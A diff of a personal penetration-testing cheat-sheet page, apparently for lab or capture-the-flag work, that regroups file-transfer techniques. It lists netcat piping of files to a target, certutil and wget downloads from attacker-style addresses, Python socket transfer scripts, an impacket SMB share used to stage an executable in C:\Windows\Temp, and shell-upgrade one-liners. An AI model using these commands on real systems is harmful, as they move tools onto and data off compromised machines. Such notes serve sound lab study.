@@ -196,8 +196,39 @@
                     <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
                     <pre><code class="language-python">script /dev/null -c bash</code> </pre>
                     
-                    <h2> File transfer with Python </h2>
-                    <h3> Server </h3>
+                    
+                </div>
+            
+             <div class="notion-header"> 
+                <h1 id="Transfer Files">Transfer Files</h1>
+            </div>
+            
+            <div class="notion-body">
+                <ul>
+                    <h2>NetCat</h2>
+                    <p>Where you recieve the file</p>
+                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
+                    <p>From where you transfer the file</p>
+                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+                </ul>
+
+                <ul>
+                    <h2>CertUtil</h2>
+                    <p>It's like WGET</p>
+                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
+                </ul>
+
+                <ul>
+
+                <h2> Python </h2>
+                <h3>Quickier way</h3>
+                <p>Open Python3 http server</p>
+                <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
+                <p>Acquire the file you want from  the client</p>
+                <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
+                
+                <h3>Longer way</h3>
+                    <h4> Server </h4>
                     <pre><code class="language-python">python3 -c "
     import socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
@@ -209,7 +240,7 @@
             while (data := file.read(1024)):
                 conn.sendall(data)
         print('Archivo enviado con éxito.')"</code></pre>
-                    <h3> Client </h3>
+                    <h4> Client </h4>
                     <pre><code class="language-python">python3 -c "
     import socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
@@ -222,8 +253,18 @@
                     break
                 file.write(data)
         print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
-                </div>
-            
+            </ul>
+
+            <ul>
+                <h2>SMB</h2>
+                <p>Open smb server</p>
+                <pre><code class="language-python">impacket-smbserver share . </code> </pre>
+                <p>From windows </p>
+                <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
+            </ul>
+
+            </div>    
+
             <div class="notion-header"> 
                 <h1 id="C">C</h1>
             </div>
@@ -238,33 +279,6 @@ int main() {
     return 0;
 }
 </code></pre>    
-                
-            <div class="notion-header"> 
-                <h1 id="Netcat">Netcat</h1>
-            </div>
-            
-            <div class="notion-body">
-                <ul>
-                    <h2> Transfer files </h2>
-                    <p>Where you recieve the file</p>
-                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
-                    <p>From where you transfer the file</p>
-                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
-                </ul>
-            </div>
-            
-            <div class="notion-header"> 
-                <h1 id="Certutil">Certutil</h1>
-            </div>
-            
-            <div class="notion-body">
-                <ul>
-                    <h2> Transfer files </h2>
-                    <p>Where you recieve the file</p>
-                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
-                    
-                </ul>
-            </div>   
             
             <div class="notion-header"> 
                 <h1 id="Sync clock rate">Sync clock rate (Windows)</h1>
